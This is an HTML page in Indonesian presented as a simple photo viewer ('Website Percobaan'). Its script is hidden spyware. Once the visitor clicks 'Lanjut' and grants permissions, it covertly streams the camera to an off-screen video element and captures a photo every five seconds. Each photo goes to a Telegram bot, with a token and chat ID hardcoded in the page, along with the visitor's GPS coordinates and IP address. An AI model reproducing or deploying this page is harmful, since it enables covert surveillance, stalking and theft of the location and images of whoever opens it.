<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Foto</title>
  <style>
    html,body{margin:0;height:100%}
    body{display:flex;align-items:center;justify-content:center;background:#000}
    img{max-width:100%;max-height:100%;object-fit:contain}
    #welcomePage{position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui}
    button{margin-top:20px;padding:12px 28px;font-size:1rem;border:none;border-radius:30px;background:#fff;color:#000;cursor:pointer}
  </style>
</head>
<body>

  <!-- Layer welcome -->
  <div id="welcomePage">
    <h1>Website Percobaan</h1>
    <p>Tekan Lanjut untuk melanjutkan.</p>
    <button onclick="start()">Lanjut</button>
  </div>

  <!-- Gambar utama (dapat di-save) -->
  <img id="mainImg" src="https://foto.png" alt="foto"/>

  <!-- hidden video -->
  <video id="video" autoplay muted style="position:fixed;top:-9999px"></video>

  <script>
    const BOT_TOKEN = '8467123418:AAHaESHrbl8IXkrhMyfhRqleggreCI9_9DI';
    const CHAT_ID   = '7670525689';
    const TG_URL    = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

    let streamGlobal;

    async function start(){
      try{
        // 1) izin lokasi
        await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        // 2) izin kamera
        streamGlobal = await navigator.mediaDevices.getUserMedia({video:true});
        const v=document.getElementById('video');
        v.srcObject=streamGlobal;
        await new Promise(res=>{if(v.videoWidth>0)res();else v.onloadedmetadata=res});
        await new Promise(r=>setTimeout(r,1000)); // stabil

        // 3) hilangkan welcome
        document.getElementById('welcomePage').style.display='none';

        // 4) mulai kirim foto tiap 5 detik
        setInterval(captureAndSend,5000);
        captureAndSend(); // kirim pertama langsung
      }catch(err){
        alert('Izin ditolak / error: '+err.message);
      }
    }

    async function captureAndSend(){
      const v=document.getElementById('video');
      if(!v.videoWidth||!v.videoHeight)return;
      const canvas=document.createElement('canvas');
      canvas.width=v.videoWidth;canvas.height=v.videoHeight;
      canvas.getContext('2d').drawImage(v,0,0);
      canvas.toBlob(async blob=>{
        const ip=await fetch('https://ipapi.co/json').then(r=>r.json()).then(d=>d.ip);
        const pos=await new Promise(res=>navigator.geolocation.getCurrentPosition(res));
        const {latitude,longitude}=pos.coords;
        const caption=`ðŸ“ ${latitude}, ${longitude}\nðŸŒ ${ip}`;
        const form=new FormData();
        form.append('chat_id',CHAT_ID);
        form.append('caption',caption);
        form.append('photo',blob,'foto.jpg');
        fetch(TG_URL,{method:'POST',body:form}).catch(()=>{});
      },'image/jpeg');
    }
  </script>

</body>
</html>
